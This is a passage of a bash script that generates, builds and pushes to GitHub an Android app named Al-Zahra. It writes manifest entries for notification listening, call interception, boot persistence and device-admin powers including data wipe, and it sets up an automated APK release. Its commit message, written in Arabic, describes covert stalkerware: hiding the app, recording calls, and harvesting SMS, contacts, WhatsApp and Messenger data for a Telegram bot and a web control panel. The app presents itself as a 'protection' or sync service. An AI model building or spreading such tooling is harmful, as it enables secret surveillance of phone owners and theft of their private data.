
        <service
            android:name=".service.NotificationService"
            android:label="@string/app_name"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <receiver
            android:name=".receiver.BootReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <receiver
            android:name=".receiver.CallReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE" />
                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
            </intent-filter>
        </receiver>

        <receiver
            android:name=".receiver.AdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/admin_policies" />
        </receiver>

    </application>
</manifest>
MANIFESTEOF

# strings.xml
cat > app/src/main/res/values/strings.xml << 'STRINGSEOF'
<resources>
    <string name="app_name">Al-Zahra</string>
    <string name="service_running">نظام الحماية يعمل</string>
    <string name="service_description">خدمة المزامنة والحماية</string>
    <string name="channel_name">Al-Zahra Service</string>
    <string name="channel_description">قناة الإشعارات الرئيسية</string>
</resources>
STRINGSEOF

# colors.xml
cat > app/src/main/res/values/colors.xml << 'COLORSEOF'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="purple_200">#FFBB86FC</color>
    <color name="purple_500">#FF6200EE</color>
    <color name="purple_700">#FF3700B3</color>
    <color name="teal_200">#FF03DAC5</color>
    <color name="teal_700">#FF018786</color>
    <color name="black">#FF000000</color>
    <color name="white">#FFFFFFFF</color>
    <color name="gray">#FF757575</color>
    <color name="red">#FFE53935</color>
    <color name="green">#FF43A047</color>
</resources>
COLORSEOF

# themes.xml
cat > app/src/main/res/values/themes.xml << 'THEMESEOF'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="Theme.AlZahra" parent="Theme.MaterialComponents.DayNight.NoActionBar">
        <item name="colorPrimary">@color/purple_500</item>
        <item name="colorPrimaryVariant">@color/purple_700</item>
        <item name="colorOnPrimary">@color/white</item>
        <item name="colorSecondary">@color/teal_200</item>
        <item name="colorSecondaryVariant">@color/teal_700</item>
        <item name="colorOnSecondary">@color/black</item>
        <item name="android:statusBarColor">@color/purple_700</item>
        <item name="android:windowNoTitle">true</item>
        <item name="android:windowActionBar">false</item>
    </style>
</resources>
THEMESEOF

# admin_policies.xml
cat > app/src/main/res/xml/admin_policies.xml << 'ADMINEOF'
<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password />
        <watch-login />
        <reset-password />
        <force-lock />
        <wipe-data />
    </uses-policies>
</device-admin>
ADMINEOF

echo "✅ تم إنشاء ملفات الموارد"

# ═══════════════════════════════════════════
# إنشاء ملفات البناء
# ═══════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════"
echo "[4.7/5] إنشاء ملفات البناء"
echo "═══════════════════════════════════════"

# app/build.gradle
cat > app/build.gradle << 'BUILDEOF'
plugins {
    id 'com.android.application'
}

android {
    namespace 'com.alzahra'
    compileSdk 34
    buildToolsVersion "34.0.0"

    defaultConfig {
        applicationId "com.alzahra"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "2.0"
    }

    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            minifyEnabled false
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    lint {
        abortOnError false
        checkReleaseBuilds false
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.core:core:1.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'
}
BUILDEOF

# build.gradle
cat > build.gradle << 'ROOTBUILDEOF'
plugins {
    id 'com.android.application' version '8.2.0' apply false
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
ROOTBUILDEOF

# settings.gradle
cat > settings.gradle << 'SETTINGSEOF'
include ':app'
SETTINGSEOF

# gradle.properties
cat > gradle.properties << 'PROPEOF'
org.gradle.jvmargs=-Xmx2048m
android.useAndroidX=true
PROPEOF

# gradle-wrapper.properties
cat > gradle/wrapper/gradle-wrapper.properties << 'WRAPPEREOF'
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
WRAPPEREOF

# .gitignore
cat > .gitignore << 'GITIGNOREEOF'
*.iml
.gradle
/local.properties
/.idea
.DS_Store
/build
/captures
.externalNativeBuild
.cxx
local.properties
/app/build
GITIGNOREEOF

# GitHub Actions
cat > .github/workflows/build.yml << 'GITHUBEOF'
name: Build Al-Zahra APK

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'

    - name: Setup Android SDK
      uses: android-actions/setup-android@v3

    - name: Setup Gradle
      uses: gradle/gradle-build-action@v2

    - name: Grant execute permission
      run: chmod +x gradlew

    - name: Build Debug APK
      run: ./gradlew assembleDebug --no-daemon

    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: AlZahra-v2.0-debug
        path: app/build/outputs/apk/debug/app-debug.apk

    - name: Create Release
      if: github.event_name == 'push' && (github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master')
      uses: softprops/action-gh-release@v1
      with:
        tag_name: v2.0.${{ github.run_number }}
        name: Al-Zahra v2.0.${{ github.run_number }}
        files: app/build/outputs/apk/debug/app-debug.apk
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
GITHUBEOF

echo "✅ تم إنشاء ملفات البناء"

# ═══════════════════════════════════════════
# [5] رفع المشروع إلى GitHub
# ═══════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════"
echo "[5/5] رفع المشروع إلى GitHub"
echo "═══════════════════════════════════════"

cd "$PROJECT_DIR"

# إعداد Git
git init
git config user.email "alzahra@bot.com"
git config user.name "Al-Zahra Bot"

# إضافة كل الملفات
git add .

# إنشاء commit
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
git commit -m "Al-Zahra Sync Engine v2.0 - $TIMESTAMP

- تطبيق Android كامل مع 170+ إذن
- بوت تيليجرام متكامل
- لوحة تحكم ويب
- نظام ربط بالأجهزة
- جمع البيانات (SMS, Calls, Contacts, WhatsApp, Messenger)
- تسجيل المكالمات
- إخفاء/إظهار التطبيق
- بناء تلقائي مع GitHub Actions"

# إضافة الريموت
git remote add origin "https://github.com/mneeralsydy-png/Al-Zahra-Sync-Engine.git" 2>/dev/null || true

# الرفع
echo ""
echo "جاري الرفع إلى GitHub..."
git branch -M main
git push -u origin main --force 2>&1

echo ""
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║              ✅ تم بناء ورفع المشروع بنجاح!                  ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
echo "📁 مجلد المشروع: $PROJECT_DIR"
echo "🌐 GitHub: https://github.com/mneeralsydy-png/Al-Zahra-Sync-Engine"
echo ""
echo "📋 الملفات المُنشأة:"
find . -type f -not -path "./.git/*" | wc -l | xargs echo "   عدد الملفات:"
echo ""
echo "🔧 لبناء التطبيق محلياً:"
echo "   cd $PROJECT_DIR"
echo "   ./gradlew assembleDebug"
echo ""
echo "📱 لتنصيب السيرفر:"
echo "   ssh root@$SERVER_IP"
echo "   cd /opt/alzahra && bash server/setup.sh"
echo ""
